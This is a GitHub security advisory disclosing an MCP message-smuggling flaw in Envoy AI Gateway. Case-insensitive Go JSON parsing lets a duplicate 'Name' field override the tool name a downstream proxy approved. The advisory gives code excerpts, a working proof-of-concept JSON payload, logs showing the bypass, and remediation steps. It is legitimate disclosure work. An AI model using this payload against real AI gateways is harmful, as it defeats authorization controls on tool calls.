# [M] Envoy AI Proxy - MCP Message Smuggling Vulnerability

## Summary
Severity: Medium
Advisory: GHSA-4gph-2hhr-5mwg
CWE: CWE-178
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-4gph-2hhr-5mwg
Type: github-advisory

## Affected
- Go: `github.com/envoyproxy/ai-gateway` — affected >=0 <0.6.0

## Details
Envoy AI Gateway was found to be affected by a protocol parser differential vulnerability due to improper implementation of the JSON-RPC 2.0 specification. Such differential causes a MCP message alteration, potentially causing a bypass of security controls in a multi-layered architecture.

According to the JSON RPC Spec used by Model Context Protocol, JSON RPC should be case sensitive https://www.jsonrpc.org/specification

```
[...]
All member names exchanged between the Client and the Server that are considered for matching of any kind should be considered to be case-sensitive. The terms function, method, and procedure can be assumed to be interchangeable.
```

The AI Gateway is accepting and processing case-variant fields that compliant MCP implementations correctly ignore. Crucially, Envoy does not just "pass through" the message by acting as a transparent proxy, it alters the traffic, allowing smuggling of unwanted requests. 

The following steps represent the incoming message alteration:
1. **Incoming MCP Message**:

```
{
    id: 1,
    jsonrpc: "2.0",
    method: "tools/call",
    params: {
        name: "backend__greet",
        Name: "backend__secretTool",
        arguments: {
            name: "World!"
        },
        Arguments: {
            name: "Exploit"
        }
    }
}
```

2. **Parses** the request, picking the non-standard `Name` field over the authorized `name` field due to internal case-insentitive parsing by libraries such as `modelcontextprotocol/go-sdk/jsonrpc` and `github.com/bytedance/sonic`
3.  **Overwrites** the authorized "backend__greet" value from the valid `name` field with the malicious value from the `Name` field
4.  **Normalizes** the injected "backend__secretTool" value (from the invalid `Name` field)
5.  **Re-serializes** the request into a new, valid MCP JRPC payload (`{"name": "backend__secretTool"}`) and forwards it upstream

This "smuggling" effect means Envoy actively transforms a request that might have been checked by any prior MCP-compliant implementation into a request that is **valid and altered** (from the perspective of the upstream backend), effectively introducing protocol modifications that may allow bypassing any prior authorization layer. 

## Root Cause Analysis

The root cause is a parser differential combined with serialization quirk typical of Go-based JSON parsers:

1. **Case-Insensitive Unmarshaling** - When parsing a JSON key into a struct field, Go's `json.Unmarshal` looks for an a case-insensitive match. Go matches "Name" to the struct tag `json:"name"`. If `"name": "safe"` is also present, the last key processed wins, allowing an attacker to inject a different tool name when the MCP message reaches the Go-SDK parsing
2. **Strict Struct-Tag Marshaling** - When converting a struct back to JSON, Go always uses the exact key specified in the Struct `json:"..."` tag. Consequently, an overwritten value from a cased field could be stored in a proper lowercased parameter, later processed by a spec-compliant MCP message receiver

The vulnerability involves the usage of the `jsonrpc` module of `github.com/modelcontextprotocol/go-sdk`, which is not following the MCP mandated JSON RPC spec for messages parsing, using case insensitive matching.

The non-compliant parsing primitive is `jsonrpc.DecodeMessage`, it is widely used to parse the incoming MCP messages.
See at:
- `ai-gateway/internal/mcpproxy/handlers.go:242,739`
- `ai-gateway/internal/mcpproxy/mcpproxy.go:303`
- `ai-gateway/internal/mcpproxy/session.go:409`
- `ai-gateway/internal/mcpproxy/sse.go:88`

Consequently, internals relying on objects parsed with the cited primitive are using case-insentive parsing, also subject to Unicode to ASCII Folding. 

Furthermore, the internal logic is also relying on the `internal/json` package, acting as a wrapper around `github.com/bytedance/sonic` (Sonic), a high-performance JSON library that defaults to loose, case-insensitive unmarshalling.

**File**: `internal/json/json.go`
```go
import (
	sonicjson "github.com/bytedance/sonic"
)
var (
	Unmarshal = sonicjson.ConfigDefault.Unmarshal
    Marshal   = sonicjson.ConfigDefault.Marshal
)
``` 

In combination with the above mentioned spec departure, the message MCP message reconstruction logic is causing an alteration of the protocol calls passing through the gateway.

### Example Vulnerable Data Flow - tools/call

The alteration occurs in `ai-gateway/internal/mcpproxy/handlers.go:180` during the processing of a function `servePOST`.

As an example, we can focus on the processing of incoming MCP `tools/call` requests.

When the gateway receives a JSON-RPC request, it executes `servePOST` function, which then calls `jsonrpc.DecodeMessage` to parse the body of the bytes read from the request.

See at `ai-gateway/internal/mcpproxy/handlers.go:235-242`
```go
...
	body, err := io.ReadAll(r.Body)
	if err != nil {
		errType = metrics.MCPErrorInternal
		onErrorResponse(w, http.StatusBadRequest, err.Error())
		return
	}

	rawMsg, err := jsonrpc.DecodeMessage(body)
    ...
```

If the request method is `tools/call`, the following code is executed at `ai-gateway/internal/mcpproxy/handlers.go:366`

```go
		case "tools/call":
			params = &mcp.CallToolParams{}
			span, err = parseParamsAndMaybeStartSpan(ctx, m, msg, params, r.Header)
			if err != nil {
				errType = metrics.MCPErrorInvalidParam
				m.l.Error("Failed to unmarshal params", slog.String("method", msg.Method), slog.String("error", err.Error()))
				onErrorResponse(w, http.StatusBadRequest, "invalid params")
				return
			}
			err = m.handleToolCallRequest(ctx, s, w, msg, params.(*mcp.CallToolParams), span, r)
```

At this point, the `params` object is a `mcp.CallToolParams` struct incorrectly parsed by Anthropic's `jsonrpc.DecodeMessage` as case insentitive object. The `params` object is then passed to `handleToolCallRequest` function, which will execute the tool call.

See at definition of `handleToolCallRequest` at `ai-gateway/internal/mcpproxy/handlers.go:638`
```go
func (m *mcpRequestContext) handleToolCallRequest(ctx context.Context, s *session, w http.ResponseWriter, req *jsonrpc.Request, p *mcp.CallToolParams, span tracingapi.MCPSpan, r *http.Request) error {

	// ... REDACTED CODE TO Enforce authentication and authorizationif required by the route ...

	// Send the request to the MCP backend listener.
	p.Name = toolName
	param, _ := json.Marshal(p)
	if m.l.Enabled(ctx, slog.LevelDebug) {
		logger := m.l.With(slog.String("tool", p.Name), slog.Any("session", cse))
		logger.Debug("Routing to backend")
	}
	if span != nil {
		span.RecordRouteToBackend(backend.Name, string(cse.sessionID), false)
	}
	req.Params = param
	return m.invokeAndProxyResponse(ctx, s, w, backend, cse, req)
}
```

In the code pattern above, the final alteration of the MCP message happens. The function is using as `json` parser the wrapper around `sonic` (`ai-gateway/internal/json`), which is a case-insensitive parser, to reserialize the parameter struct with `json.Marshal`.

When the struct is **re-marshaled**, it uses the exact casing defined in the struct's JSON tag. This allows an attacker to "smuggle" a malicious value through a non-standard key name, bypassing case-sensitive filters on previous stages of the request handling by other MCP-compliant components.

In conclusion, the described MCP message alteration is ensuring that the final proxied version by Envoy-AI Gateway will become "canonical" and delivered upstream with smuggled malicious values.

### Other Message Types

The Parser Differential is not limited to `tools/call`. It is a pervasive design issue caused by the Go SDK and Sonic manipulation of MCP Messages.

List of smuggling sinks:
- `tools/call` 
- `prompts/get`
- `resources/read`

In conclusion, the reported smuggling problem is systemic in the AI Proxy.

## Proof of Concept

Payload:

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "backend__greet",      // SAFE: Validated & Allowed by Edge Proxy
    "Name": "backend__secretTool", // UNSAFE: By-passes Edge authz checks, altered by Envoy and delivered upstream
    "arguments": {"name": "Exploit"}
  },
  "id": 1
}
```

Scenario:

<img width="1588" height="407" alt="image" src="https://github.com/user-attachments/assets/326731f0-515c-489b-87f3-b386b1e1831d" />

The full PoC can be downloaded as `envoy-security@googlegroups.com` at: https://doyensec.sendsafely.com/receive/?thread=3574-4CPK&packageCode=lAXsPv8NK0tR0VTEXno9DZjFB5Ph3eKaSER6rpiirvk#keyCode=R_jMV3ENlORCmzkka3jwupPgsUq-TqNOAoizUqzlWHg

Prerequisites are having installed: Minikube, Docker and Helm.

In order to reproduce the scenario, it is sufficient to run the described stack with the commands below:
```
chmod +x full_PoC.sh
./full_PoC.sh
```

The PoC will:
1. Start a MCP-cmpliant downstream proxy that should block requests to `backend__secretTool`
2. Start the Envoy AI Gateway and configure it as basic router
3. Start an upstream MCP server exposing `backend__secretTool` and `backend_greet`
4. Send MCP `tools/call` requests to the downstream proxy to demonstrate the vulnerability

It is also possible to inspect the full traffic proccessing logs at `PoC/logs/`.

The example below shows the final PoC smuggled message received and executed by the upstream MCP Server:

```
cat PoC/logs/server_container.log

...[REDACTED]...
INFO:     10.244.0.6:33404 - "POST /mcp HTTP/1.1" 200 OK
[2026-02-11T14:57:11.055237] ← PROCESSED MCP REQ: initialize
INFO:     10.244.0.6:33404 - "POST /mcp HTTP/1.1" 202 Accepted
INFO:     10.244.0.6:33420 - "POST /mcp HTTP/1.1" 200 OK
[2026-02-11T14:57:11.334681] → RECEIVED MCP REQ: tools/list
[2026-02-11T14:57:11.334924]   Payload: {
  "method": "tools/list",
  "params": null
}
[2026-02-11T14:57:11.335298] ← PROCESSED MCP REQ: tools/list
[2026-02-11T14:57:11.336396] → RECEIVED MCP REQ: tools/call
[2026-02-11T14:57:11.336467]   Payload: {
  "task": null,
  "meta": null,
  "name": "greet",
  "arguments": {
    "name": "User"
  }
}
[2026-02-11T14:57:11.336665] greet called with name=User
[2026-02-11T14:57:11.336935] ← PROCESSED MCP REQ: tools/call
INFO:     10.244.0.6:33420 - "POST /mcp HTTP/1.1" 200 OK
[2026-02-11T14:57:11.552185] → RECEIVED MCP REQ: tools/call
[2026-02-11T14:57:11.552341]   Payload: {
  "task": null,
  "meta": null,
  "name": "secretTool",
  "arguments": {
    "name": "ExploitUser"
  }
}
[2026-02-11T14:57:11.552422] LEAK: secretTool called with name=ExploitUser
[2026-02-11T14:57:11.552483] ← PROCESSED MCP REQ: tools/call
```

While below is reported the log of the downstream compliant proxy that allowed the message as compliant `greet` command before it was smuggled by Envoy AI Proxy:

```
2026-02-11 14:57:11,408 - downstream-proxy - INFO - Incoming request: method='tools/call' params={'name': 'backend__secretTool', 'arguments': {'name': 'Hacker'}} jsonrpc='2.0' id=3 [tool: backend__secretTool]
2026-02-11 14:57:11,408 - downstream-proxy - INFO - Inspecting tools/call for tool: backend__secretTool
2026-02-11 14:57:11,408 - downstream-proxy - WARNING - BLOCKED: Attempt to call restricted tool 'backend__secretTool'
INFO:     127.0.0.1:33768 - "POST /mcp HTTP/1.1" 403 Forbidden
2026-02-11 14:57:11,514 - downstream-proxy - INFO - Incoming request: method='tools/call' params={'name': 'backend__greet', 'arguments': {'name': 'ExploitUser'}, 'Name': 'backend__secretTool'} jsonrpc='2.0' id=3 [tool: backend__greet]
2026-02-11 14:57:11,514 - downstream-proxy - INFO - Inspecting tools/call for tool: backend__greet
2026-02-11 14:57:11,514 - downstream-proxy - INFO - ALLOWED: Tool 'backend__greet' passed policy check.
2026-02-11 14:57:11,578 - httpx - INFO - HTTP Request: POST http://envoy-default-aigw-run-85f8cf28.envoy-gateway-system.svc.cluster.local:1975/mcp "HTTP/1.1 200 OK"
INFO:     127.0.0.1:33780 - "POST /mcp HTTP/1.1" 200 OK
```

## Impact
This vulnerability makes downstream authorization layers ineffective when Envoy AI Gateway is used as a router. By altering the message content, Envoy effectively acts as a "Confused Deputy" that:
1.  **Trusted Input**: Takes input trusted by the other MCP-compliant actors 
2.  **Malicious Transformation**: Converts it into a totally different, but compliant, MCP message. Violating the transparency nature of proxies and altering a valid request into a malicious one
3.  **Trusted Output**: Sends it off as a valid request to the upstream backend

Authentication and Authorization guarantees provided by prior actors or MCP manipulations are nullified because the original message **is not** the message the target Backend receives.

## Remediation

1. Strict Protocol Compliance
Envoy AI Gateway must enforce **Strict Case Sensitivity** during JSON unmarshalling to comply with JSON-RPC 2.0.

2. Reject Unknown Fields In Protocol Reserved Areas
Enable `DisallowUnknownFields`.

3. Preserve Integrity
If Envoy acts as a transparent router, it should avoid unnecessary re-serialization of the payload body unless modification is explicitly required and safe. If normalization is required, it must be lossless and strictly validated.

It should be highlighted that after our root-cause analysis, `github.com/modelcontextprotocol/go-sdk` is ultimately responsible for the initial part the issue. As a result, we would expect the maintainers to fix the vulnerability upstream.

As a general recommendation, Envoy AI Gateway should use a JSON RPC parser and subsequent JSON parsing strategies in `sonic` which are following the SPEC to prevent the differentials, forcing the case sensitive matching on MCP messages. 

Doyensec has already reported the Go-SDK violation of the JSON RPC Specification via Hackerone.

## References
- https://github.com/envoyproxy/ai-gateway/security/advisories/GHSA-4gph-2hhr-5mwg
- https://github.com/envoyproxy/ai-gateway
